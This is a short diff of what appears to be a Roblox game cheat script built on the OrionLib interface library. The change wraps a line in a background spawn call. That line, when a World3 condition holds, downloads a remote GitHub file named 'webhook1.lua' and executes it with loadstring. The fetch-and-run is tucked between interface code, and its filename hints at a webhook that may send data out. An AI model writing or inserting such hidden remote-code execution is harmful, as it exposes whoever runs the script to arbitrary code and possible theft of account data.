@@ -7667,8 +7667,10 @@ MiscTab:AddButton({
   	end    
 })
 
+spawn(function()
 if World3 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Inforedmc1346/source-code/main/webhook1.lua"))()
 end
+end)
 
 OrionLib:Init()
